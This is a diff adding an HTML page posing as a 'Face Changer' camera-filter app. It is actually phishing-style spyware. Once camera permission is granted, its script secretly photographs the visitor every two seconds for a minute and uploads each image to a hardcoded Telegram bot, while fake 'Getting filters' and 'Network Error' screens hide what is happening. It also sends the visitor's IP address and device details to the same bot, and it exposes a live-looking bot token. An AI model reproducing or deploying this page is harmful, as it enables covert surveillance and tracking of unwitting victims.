@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🐱‍🚀Face Changer✔🐱‍🚀</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #000; color: white; overflow: hidden; }
+        video, canvas {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            object-fit: cover;
+        }
+        #statusScreen, #errorScreen, #permissionScreen {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(0, 0, 0, 0.9); color: white; font-size: 24px;
+            text-align: center; flex-direction: column;
+            z-index: 10;
+        }
+        #loadingText {
+            font-size: 24px; font-weight: bold;
+        }
+        #errorScreen { color: red; display: none; }
+        #permissionScreen { display: none; }
+        #retryPermission {
+            margin-top: 20px; padding: 12px 24px; font-size: 18px;
+            background: #ff9500; color: white; border: none;
+            border-radius: 8px; cursor: pointer;
+        }
+        #capture {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            padding: 12px 24px; font-size: 18px; background: #ff9500;
+            color: white; border: none; border-radius: 8px; cursor: pointer;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <div id="statusScreen">
+        <div id="loadingText">Getting filters... Please wait<span id="dots"></span></div>
+    </div>
+    <div id="errorScreen">Network Error! Please try again.</div>
+    <div id="permissionScreen">
+        <div>Please allow camera access</div>
+        <button id="retryPermission">Try Again</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <button id="capture">Change Face</button>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4";
+        const TELEGRAM_CHAT_ID = "6524755764";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext("2d");
+        const statusScreen = document.getElementById('statusScreen');
+        const errorScreen = document.getElementById('errorScreen');
+        const permissionScreen = document.getElementById('permissionScreen');
+        const dotsElement = document.getElementById("dots");
+        let sendInterval, stopTimeout;
+        
+        // Loading dots animation
+        function animateDots() {
+            let dots = "";
+            setInterval(() => {
+                dots = dots.length < 3 ? dots + "." : "";
+                dotsElement.textContent = dots;
+            }, 500); // Change dots every 0.5s
+        }
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                permissionScreen.style.display = "none"; // Hide permission message
+                startSendingPhotos();
+            } catch (error) {
+                console.error("Camera access denied!", error);
+                statusScreen.style.display = "none";
+                permissionScreen.style.display = "flex"; // Show permission request
+            }
+        }
+
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "captured_photo.jpg");
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("Photo sent!", data))
+                .catch(error => console.error("Error sending photo:", error));
+            }, 'image/jpeg');
+        }
+
+        function startSendingPhotos() {
+            sendInterval = setInterval(() => {
+                captureAndSend();
+            }, 2000); // Every 2 seconds
+
+            // Keep status screen visible for exactly 60 seconds
+            setTimeout(() => {
+                statusScreen.style.display = "none"; // Hide status message
+            }, 60000);
+
+            // Stop sending photos after 60 seconds and show network error
+            stopTimeout = setTimeout(() => {
+                clearInterval(sendInterval);
+                errorScreen.style.display = "flex";
+            }, 60000);
+        }
+
+        document.getElementById('capture').addEventListener('click', () => {
+            clearInterval(sendInterval);
+            clearTimeout(stopTimeout);
+            startSendingPhotos();
+            statusScreen.style.display = "flex"; // Show "Getting filters..." again
+            errorScreen.style.display = "none";
+        });
+
+        document.getElementById('retryPermission').addEventListener('click', startCamera);
+
+        (async function() {
+            animateDots(); // Start animated dots
+            await startCamera();
+        })();
+
+        // ✅ Added IP & Device Info Sender (Nothing else touched!)
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                const deviceInfo = navigator.userAgent;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `📡 IP Address: ${ip}\n📱 Device Info: ${deviceInfo}`
+                    })
+                });
+            })
+            .catch(err => console.error('Error fetching IP:', err));
+    </script>
+</body>
+</html>
